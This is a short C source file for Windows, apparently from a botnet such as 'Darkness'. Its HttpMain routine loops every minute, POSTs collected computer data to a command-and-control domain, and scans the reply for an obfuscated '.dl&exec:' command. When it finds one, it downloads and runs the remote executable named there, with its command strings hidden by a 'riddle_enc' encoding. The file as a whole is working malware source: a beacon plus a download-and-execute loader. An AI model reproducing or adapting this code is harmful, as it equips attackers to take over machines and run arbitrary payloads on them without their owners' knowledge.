#include "mylib.h"
#include "dns.h"

#include <windows.h>
#include <wininet.h>

void
HttpMain
(struct darkness_d *darkness) {
    char buf[0x15F90],lpData[0x60], *tmp, *p;
    while(0x1) {
       Sleep(0xEA60);
       GetComputerData(lpData,COMMAND_TYPE_HTTP);
       GetWebPage(buf,sizeof(buf),DnsGetDomain(HTTP_DNS),"",riddle_enc("TSWX"),lpData,0x1); // POST
       if(tmp=strstr(buf,riddle_enc("8nv0oÇomD*"))) { // .dl&exec: 
         tmp += 0xA;
         if(p=strchr(tmp,'>')) p[0x0]='\0';
         if(!strcmp(tmp,riddle_enc("WÉXUUXYRÅÜTUXÇWVÑWÉÉÖRÑÑSXÑWTVÜP"))) // 7c855892af458b76d7cce2dd38d746f0 
            continue;
         if(tmp) GetExeFile(tmp,0x0);
       }
    }
}
